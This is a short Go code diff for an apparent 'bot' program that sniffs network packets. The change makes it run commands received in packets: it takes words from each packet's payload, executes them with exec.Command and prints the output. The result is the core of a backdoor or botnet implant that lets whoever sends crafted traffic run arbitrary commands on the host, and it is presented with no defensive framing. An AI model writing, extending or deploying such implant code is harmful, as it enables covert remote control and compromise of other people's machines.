@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"log"
 	"net"
+	"os/exec"
 	"strings"
 	"time"
 
@@ -34,7 +35,15 @@ func botProcessPacket(packet gopacket.Packet) {
 	data := string(packet.ApplicationLayer().Payload())
 
 	payload := strings.Split(data, " ")
-	fmt.Println("Payload:", payload[1:])
+	command := payload[1]
+	// args := payload[2:]
+	args := strings.Join(payload[2:], " ")
+
+	out, err := exec.Command(command, args).Output()
+	if err != nil {
+		log.Fatal(err)
+	}
+	fmt.Println("[+] OUTPUT:", string(out))
 }
 
 func main() {
